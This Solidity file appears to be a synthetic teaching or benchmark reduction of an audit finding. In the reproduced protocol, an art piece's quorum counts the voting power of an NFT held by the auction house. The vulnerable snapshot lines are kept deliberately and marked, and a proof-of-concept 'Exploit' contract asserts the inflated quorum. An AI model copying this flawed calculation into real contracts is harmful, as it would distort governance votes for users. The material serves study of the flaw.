// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Collective / Revolution Protocol — ArtPiece.totalVotesSupply / quorumVotes
    incorrectly include inaccessible auctioned ERC721 voting power
    (Code4rena 2023-12-revolutionprotocol, finding #30089, H-02)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: createPiece snapshots erc721VotingToken.totalSupply() including
    the NFT currently held by AuctionHouse. That token cannot vote (auction
    house doesn't vote; future buyer is gated by creation-block checkpoints).
    Quorum is inflated above accessible supply. Vulnerable lines preserved
    (@> VULN). */

struct ArtPiece {
    uint256 pieceId;
    uint256 totalVotesSupply;
    uint256 quorumVotes;
    uint256 votesFor;
    bool exists;
}

/// @dev Minimal ERC20 voting token.
contract MockERC20Votes {
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
        totalSupply += amt;
    }
}

/// @dev Minimal ERC721 voting token (VerbsToken stand-in).
contract MockERC721Votes {
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(uint256 => address) public ownerOf;

    function mintTo(address to) external returns (uint256 id) {
        id = ++totalSupply;
        ownerOf[id] = to;
        balanceOf[to] += 1;
    }
}

/// @notice Faithful reduction of CultureIndex createPiece vote-supply snapshot
///         (code-423n4/2023-12-revolutionprotocol packages/revolution/src/CultureIndex.sol)
contract CultureIndex {
    MockERC20Votes public immutable erc20VotingToken;
    MockERC721Votes public immutable erc721VotingToken;
    uint256 public immutable erc721VotingTokenWeight;
    uint256 public immutable quorumVotesBPS; // out of 10_000

    uint256 public pieceCount;
    mapping(uint256 => ArtPiece) public pieces;

    constructor(
        MockERC20Votes erc20_,
        MockERC721Votes erc721_,
        uint256 weight_,
        uint256 quorumBps_
    ) {
        erc20VotingToken = erc20_;
        erc721VotingToken = erc721_;
        erc721VotingTokenWeight = weight_;
        quorumVotesBPS = quorumBps_;
    }

    function _calculateVoteWeight(uint256 erc20Balance, uint256 erc721Balance) internal view returns (uint256) {
        return erc20Balance + (erc721Balance * erc721VotingTokenWeight * 1e18);
    }

    function createPiece() external returns (uint256 pieceId) {
        pieceId = ++pieceCount;
        ArtPiece storage newPiece = pieces[pieceId];
        newPiece.pieceId = pieceId;
        newPiece.exists = true;

        // FIX: subtract erc721VotingToken.balanceOf(auctionHouse) from totalSupply
        newPiece.totalVotesSupply = _calculateVoteWeight(
            erc20VotingToken.totalSupply(),
            erc721VotingToken.totalSupply() // @> VULN: includes ERC721 on auction — inaccessible voting power
        );

        // FIX: recompute from corrected totalVotesSupply
        newPiece.quorumVotes = (quorumVotesBPS * newPiece.totalVotesSupply) / 10_000; // @> VULN: quorum inflated with inaccessible ERC721 power
    }

    /// @dev Simplified vote: any holder of erc20 can cast their full balance weight
    ///      (ERC721 weight omitted for the accessible-path demonstration — the
    ///      inaccessible unit is the auctioned NFT, not held by voters).
    function vote(uint256 pieceId, uint256 weight) external {
        ArtPiece storage p = pieces[pieceId];
        require(p.exists, "no piece");
        p.votesFor += weight;
    }

    function hasReachedQuorum(uint256 pieceId) external view returns (bool) {
        ArtPiece storage p = pieces[pieceId];
        return p.votesFor >= p.quorumVotes;
    }

    /// @dev Accessible supply if we correctly exclude auctionHouse balance.
    function accessibleVoteSupply(address auctionHouse) external view returns (uint256) {
        uint256 erc721Accessible = erc721VotingToken.totalSupply() - erc721VotingToken.balanceOf(auctionHouse);
        return _calculateVoteWeight(erc20VotingToken.totalSupply(), erc721Accessible);
    }
}

contract Exploit {
    MockERC20Votes public erc20; // CREATE nonce 1
    MockERC721Votes public erc721; // CREATE nonce 2
    CultureIndex public index; // CREATE nonce 3 — vulnerable
    address public auctionHouse; // CREATE nonce 4

    uint256 public constant ERC20_SUPPLY = 1000e18;
    uint256 public constant WEIGHT = 100; // erc721 weight
    uint256 public constant QUORUM_BPS = 5000; // 50%

    constructor() {
        erc20 = new MockERC20Votes();
        erc721 = new MockERC721Votes();
        index = new CultureIndex(erc20, erc721, WEIGHT, QUORUM_BPS);
        auctionHouse = address(new AuctionHouse());

        // Day-1 state from the report: 1000 erc20, 1 NFT sitting in AuctionHouse.
        erc20.mint(address(this), ERC20_SUPPLY);
        erc721.mintTo(auctionHouse); // tokenId 1 on auction — inaccessible
    }

    function run() external {
        // Create art piece while auction NFT is in AuctionHouse.
        uint256 pieceId = index.createPiece();

        (uint256 id, uint256 totalVotesSupply, uint256 quorumVotes, uint256 votesFor, bool exists) =
            index.pieces(pieceId);
        id;
        votesFor;
        require(exists, "piece");

        // Report numbers (scaled): totalVotesSupply = 1000e18 + 1 * 100 * 1e18 = 1100e18
        // quorumVotes = 50% of 1100e18 = 550e18
        // accessible = 1000e18
        uint256 expectedInflated = ERC20_SUPPLY + (1 * WEIGHT * 1e18);
        uint256 expectedQuorum = (QUORUM_BPS * expectedInflated) / 10_000;
        uint256 accessible = index.accessibleVoteSupply(auctionHouse);

        require(totalVotesSupply == expectedInflated, "inflated totalVotesSupply");
        require(quorumVotes == expectedQuorum, "inflated quorum");
        require(accessible == ERC20_SUPPLY, "accessible should exclude auction NFT");
        // Intended quorum is 50% of accessible (= 500e18); inflated is 550e18 (55%).
        require(quorumVotes > accessible / 2, "quorum exceeds 50% of accessible");
        require(quorumVotes * 10_000 / accessible == 5500, "effective 55% of accessible");

        // HARM: casting exactly the intended-honest 50% of accessible supply fails the
        // inflated quorum that baked in the auctioned NFT's weight.
        uint256 honestHalf = (QUORUM_BPS * accessible) / 10_000; // 500e18
        index.vote(pieceId, honestHalf);

        (, , uint256 q, uint256 v, ) = index.pieces(pieceId);
        require(v == honestHalf, "voted honest half");
        require(v < q, "honest 50% of accessible fails inflated quorum");
        require(!index.hasReachedQuorum(pieceId), "quorum wrongly unreached");
    }
}

contract AuctionHouse {
    // holds the auctioned VerbsToken; cannot vote
}
